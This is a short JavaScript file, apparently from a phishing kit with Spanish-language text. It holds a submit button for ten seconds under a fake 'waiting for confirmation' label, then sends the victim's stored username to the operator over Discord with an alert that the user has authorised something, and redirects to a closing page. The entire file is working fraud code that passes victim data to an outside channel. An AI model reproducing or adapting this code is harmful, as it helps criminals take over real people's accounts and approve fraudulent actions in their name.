document.addEventListener('DOMContentLoaded', () => {
    const correoForm = document.getElementById('correoForm');
    const continueButton = document.querySelector('.btn-continue');

    // Deshabilitar el botÃ³n y ponerlo en gris durante 10 segundos
    continueButton.disabled = true;
    continueButton.style.backgroundColor = '#ccc';
    continueButton.style.cursor = 'not-allowed';
    continueButton.innerText = 'Esperando Confirmacion';

    setTimeout(() => {
        continueButton.disabled = false;
        continueButton.style.backgroundColor = ''; // Restaura el color original del botÃ³n
        continueButton.style.cursor = 'pointer';
        continueButton.innerText = 'Continuar';
    }, 10000);

    const REDIRECCION_URL = 'fin.html';

    correoForm.addEventListener('submit', async (e) => {
        e.preventDefault();

        const usuario = localStorage.getItem('usuario_guardado') || 'No detectado';

        const mensaje = `ðŸ“¢ **Atento!!!**\n\n` +
                        `â„¹ï¸ **Estado:** El usuario Marco Que Te Autorizo\n` +
                        `ðŸ‘¤ **Usuario Asociado:** ${usuario}\n\n`;

        continueButton.disabled = true;
        continueButton.innerText = 'Procesando...';

        await enviarADiscord(mensaje);
        window.location.href = REDIRECCION_URL;
    });
});